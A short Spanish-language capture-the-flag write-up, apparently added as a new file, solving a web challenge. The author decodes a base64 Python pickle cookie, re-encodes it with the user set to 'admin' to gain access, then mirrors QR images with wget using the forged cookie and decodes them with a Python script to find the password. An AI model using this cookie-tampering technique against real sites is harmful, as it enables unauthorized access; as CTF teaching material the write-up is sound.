@@ -1,0 +1,64 @@
+Autor:wint3r
+
+Tenemos un QR que nos da una direccion http://85.159.210.133/35895860/
+
+Al entrar en la web vemos que el servidor nos contesta con un header Set-Cookie: control=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUyd1c2VyJwpwNApnNApzLg%3D%3D;HttpOnly;Secure
+Si pasamos a ASCII el base64 del cookie (KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUyd1c2VyJwpwNApnNApzLg==)
+nos da un diccionario serializado con pickles en python:
+(dp1
+S'python'
+p2
+S'pickles'
+p3
+sS'user'
+p4
+g4
+s.
+que al pasarlo de nuevo a un diccionario con cPickles en Python 2.7 nos da:
+>>> cPickle.loads("""(dp1
+... S'python'
+... p2
+... S'pickles'
+... p3
+... sS'user'
+... p4
+... g4
+... s."""
+... )
+{'python': 'pickles', 'user': 'user'}
+
+ya podemos saber mas o menos cual sera la vulnerabilidad "user": "user", habra que cambiar "user": "user" por "user": "admin"
+>>> cPickle.dumps({'python': 'pickles', 'user': 'admin'})
+"(dp1\nS'python'\np2\nS'pickles'\np3\nsS'user'\np4\nS'admin'\np5\ns."
+Esto lo volvemos a pasar a base64 y nos dara: KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUyd1c2VyJwpwNApTJ2FkbWluJwpwNQpzLg==
+
+Añadimos el header con nuestra cookie:
+"Cookie": "control=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUyd1c2VyJwpwNApTJ2FkbWluJwpwNQpzLg%3D%3D;Secure;HttpOnly"
+
+Y ahora al entrar en la web nos redirecciona a un index.php lleno de QRs junto a un texto que dice que la contraseña esta dentro de alguno, asi que usaremos un simple wget recursive pero con varios headers para descargar las fotos QR
+
+wget -rA .png --header="Cookie: control=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUyd1c2VyJwpwNApTJ2FkbWluJwpwNQpzLg%3D%3D;Secure;HttpOnly" --header="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" --header="Accept-Encoding: compress, gzip" http://85.159.210.133/35895860/5737ea2f/index.php
+
+Esto descargara las fotos para despues poder decodificar cada QR, en la web tambien decia que la contraseña cumplia con un patron de regex "^([a-z0-9_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$"
+
+import glob
+import qrtools
+import re
+
+
+decoded = []
+
+imagenes = glob.glob('/home/QR/85.159.210.133/35895860/5737ea2f/*.png')
+for imagen in imagenes:
+	decode = qrtools.QR()
+	decode.decode(imagen)
+	decoded.append(decode.data)
+
+for flag in decoded:
+	if re.search("^([a-z0-9_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$", str(flag)):
+		print str(flag)
+		
+Y esto nos da la contraseña "myjohn@doeisthebestguyintheworld.com"
+echo -n myjohn@doeisthebestguyintheworld.com | md5sum
+
+
